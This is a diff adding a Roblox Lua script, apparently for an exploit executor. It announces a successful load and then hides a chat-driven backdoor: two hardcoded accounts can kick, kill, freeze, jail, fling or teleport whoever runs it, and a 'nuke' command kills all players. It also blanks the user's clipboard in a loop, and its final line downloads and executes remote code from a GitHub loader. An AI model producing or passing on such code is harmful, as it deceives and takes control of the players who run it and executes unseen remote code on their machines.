@@ -1,0 +1,285 @@
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local StarterGui = game:GetService("StarterGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+
+local commandUsers = {"mizu1216dao", "unti1101"}
+local rejoinTargets = {"tokagemann7", "nazeelephantataru", "masaokun3", "mizulove1107", "mizudesu1107"}
+
+local jailModel = nil
+local jailCenter = nil
+local jailActive = false
+local frozen = false
+
+pcall(function()
+	StarterGui:SetCore("SendNotification", {
+		Title = "Success",
+		Text = "Script loaded successfully.",
+		Duration = 3
+	})
+end)
+
+local function isCommandUser(name)
+	for _, u in ipairs(commandUsers) do
+		if name == u then return true end
+	end
+	return false
+end
+
+local function getPlayersByNames(names)
+	local result = {}
+	for _, plr in ipairs(Players:GetPlayers()) do
+		for _, name in ipairs(names) do
+			if plr.Name == name then table.insert(result, plr) end
+		end
+	end
+	return result
+end
+
+local function jailPlayer(duration)
+	local char = LocalPlayer.Character
+	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+	if jailModel then jailModel:Destroy() end
+	local hrp = char.HumanoidRootPart
+	local pos = hrp.Position
+	local model = Instance.new("Model")
+	model.Name = "JailCell"
+	local size = Vector3.new(12, 10, 12)
+	local function makeWall(size, position)
+		local part = Instance.new("Part")
+		part.Anchored = true
+		part.Size = size
+		part.Position = position
+		part.Color = Color3.new(0,0,0)
+		part.Transparency = 0.4
+		part.CanCollide = true
+		part.Parent = model
+	end
+	local halfX, halfY, halfZ = size.X/2, size.Y/2, size.Z/2
+	makeWall(Vector3.new(size.X,1,size.Z), pos + Vector3.new(0,-halfY,0))
+	makeWall(Vector3.new(size.X,1,size.Z), pos + Vector3.new(0,halfY,0))
+	makeWall(Vector3.new(1,size.Y,size.Z), pos + Vector3.new(halfX,0,0))
+	makeWall(Vector3.new(1,size.Y,size.Z), pos + Vector3.new(-halfX,0,0))
+	makeWall(Vector3.new(size.X,size.Y,1), pos + Vector3.new(0,0,halfZ))
+	makeWall(Vector3.new(size.X,size.Y,1), pos + Vector3.new(0,0,-halfZ))
+	model.Parent = Workspace
+	jailModel = model
+	jailCenter = pos
+	jailActive = true
+	if duration then
+		task.delay(duration, function()
+			if jailActive then
+				if jailModel then jailModel:Destroy() end
+				jailActive = false
+				jailModel = nil
+				jailCenter = nil
+			end
+		end)
+	end
+end
+
+local function unjailPlayer()
+	if jailModel then jailModel:Destroy() end
+	jailModel = nil
+	jailCenter = nil
+	jailActive = false
+end
+
+RunService.Heartbeat:Connect(function()
+	if jailActive and jailCenter and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+		local hrp = LocalPlayer.Character.HumanoidRootPart
+		local dist = (hrp.Position - jailCenter).Magnitude
+		if dist > 8 then
+			hrp.CFrame = CFrame.new(jailCenter + Vector3.new(0,2,0))
+		end
+	end
+end)
+
+local function freezePlayer(duration)
+	local char = LocalPlayer.Character
+	if not char then return end
+	for _, p in pairs(char:GetDescendants()) do
+		if p:IsA("BasePart") then p.Anchored = true end
+	end
+	frozen = true
+	if duration then
+		task.delay(duration, function()
+			if frozen then
+				for _, p in pairs(char:GetDescendants()) do
+					if p:IsA("BasePart") then p.Anchored = false end
+				end
+				frozen = false
+			end
+		end)
+	end
+end
+
+local function unfreezePlayer()
+	local char = LocalPlayer.Character
+	if not char then return end
+	for _, p in pairs(char:GetDescendants()) do
+		if p:IsA("BasePart") then p.Anchored = false end
+	end
+	frozen = false
+end
+
+local function executeCommand(sender,message)
+	if not isCommandUser(sender) then return end
+	message = string.lower(message)
+	message = message:gsub("^;", ":")
+	if string.find(message, ":rejoin") then
+		for _, target in ipairs(getPlayersByNames(rejoinTargets)) do
+			task.spawn(function() TeleportService:Teleport(game.PlaceId,target) end)
+		end
+	elseif string.find(message, ":keystock") then
+		local num = message:match(":keystock%s*(%d+)")
+		if num then
+			StarterGui:SetCore("SendNotification", {
+				Title="残りのキーストック",
+				Text=num,
+				Duration=3
+			})
+		end
+	elseif string.find(message, ":bring") then
+		local senderPlr = Players:FindFirstChild(sender)
+		if senderPlr and senderPlr.Character and senderPlr.Character:FindFirstChild("HumanoidRootPart") 
+			and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+			LocalPlayer.Character.HumanoidRootPart.CFrame = senderPlr.Character.HumanoidRootPart.CFrame + Vector3.new(0,3,0)
+		end
+	elseif string.find(message, ":kill") then
+		local char = LocalPlayer.Character
+		if char then
+			local humanoid = char:FindFirstChildOfClass("Humanoid")
+			if humanoid then
+				humanoid.Health = 0
+			else
+				LocalPlayer:LoadCharacter()
+			end
+		end
+	elseif string.find(message, ":kick") then
+		local msgArg = message:match(":kick%s*(.*)")
+		msgArg = msgArg ~= "" and msgArg or "Kicked by command."
+		LocalPlayer:Kick(msgArg)
+	elseif string.find(message, ":bomb") then
+		local char = LocalPlayer.Character
+		if char and char:FindFirstChild("HumanoidRootPart") then
+			local explosion = Instance.new("Explosion")
+			explosion.Position = char.HumanoidRootPart.Position
+			explosion.BlastRadius = 15
+			explosion.BlastPressure = 500000
+			explosion.Parent = Workspace
+		end
+	elseif string.find(message, ":fling") then
+		local char = LocalPlayer.Character
+		if char and char:FindFirstChild("HumanoidRootPart") then
+			char.HumanoidRootPart.Velocity = Vector3.new(0,1500,0)
+			task.delay(3,function()
+				local humanoid = char:FindFirstChildOfClass("Humanoid")
+				if humanoid then
+					humanoid.Health = 0
+				else
+					LocalPlayer:LoadCharacter()
+				end
+			end)
+		end
+	elseif string.find(message, ":freeze") then
+		local duration = tonumber(message:match(":freeze%s*(%d+)"))
+		freezePlayer(duration)
+	elseif string.find(message, ":unfreeze") then
+		unfreezePlayer()
+	elseif string.find(message, ":jail") then
+		local duration = tonumber(message:match(":jail%s*(%d+)"))
+		jailPlayer(duration)
+	elseif string.find(message, ":unjail") then
+		unjailPlayer()
+	elseif string.find(message, ":nuke") then
+		local char = LocalPlayer.Character
+		if not char then return end
+		local root = char:FindFirstChild("HumanoidRootPart")
+		if not root then return end
+		local oldBrightness = Lighting.Brightness
+		local oldColor = Lighting.OutdoorAmbient
+		Lighting.Brightness = 0.2
+		Lighting.OutdoorAmbient = Color3.fromRGB(255,0,0)
+		local nuke = Instance.new("Part")
+		nuke.Shape = Enum.PartType.Ball
+		nuke.Size = Vector3.new(100,100,100)
+		nuke.Material = Enum.Material.Neon
+		nuke.Color = Color3.fromRGB(255,0,0)
+		nuke.Anchored = false
+		nuke.Position = root.Position + Vector3.new(0,300,0)
+		nuke.Parent = Workspace
+		local bv = Instance.new("BodyVelocity",nuke)
+		bv.Velocity = Vector3.new(0,-500,0)
+		bv.MaxForce = Vector3.new(1e6,1e6,1e6)
+		nuke.Touched:Connect(function(hit)
+			if hit and nuke.Parent then
+				local smoke = Instance.new("Smoke")
+				smoke.Size = 50
+				smoke.RiseVelocity = 50
+				smoke.Color = Color3.new(0,0,0)
+				smoke.Opacity = 0.5
+				smoke.Parent = Workspace.Terrain
+				local explosion = Instance.new("Explosion")
+				explosion.Position = hit.Position
+				explosion.BlastRadius = 100
+				explosion.BlastPressure = 1e6
+				explosion.Parent = Workspace
+				for _,p in pairs(Players:GetPlayers()) do
+					if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+						p.Character.HumanoidRootPart.Velocity = Vector3.new(0,1000,0)
+						task.delay(0.1,function()
+							local humanoid = p.Character:FindFirstChildOfClass("Humanoid")
+							if humanoid then
+								humanoid.Health = 0
+							else
+								p:LoadCharacter()
+							end
+						end)
+					end
+				end
+				task.delay(10,function()
+					if nuke then nuke:Destroy() end
+					Lighting.Brightness = oldBrightness
+					Lighting.OutdoorAmbient = oldColor
+					if smoke then smoke:Destroy() end
+				end)
+			end
+		end)
+	end
+end
+
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+	TextChatService.MessageReceived:Connect(function(msg)
+		if msg and msg.TextSource then
+			executeCommand(msg.TextSource.Name,msg.Text)
+		end
+	end)
+else
+	local chatFolder = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+	if chatFolder then
+		local event = chatFolder:FindFirstChild("OnMessageDoneFiltering")
+		if event then
+			event.OnClientEvent:Connect(function(data)
+				if data and data.FromSpeaker and data.Message then
+					executeCommand(data.FromSpeaker,data.Message)
+				end
+			end)
+		end
+	end
+end
+
+task.spawn(function()
+    while true do
+        setclipboard("")
+        task.wait(1/3)
+    end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/stormskmonkey/JinkX/main/Loader.lua"))()
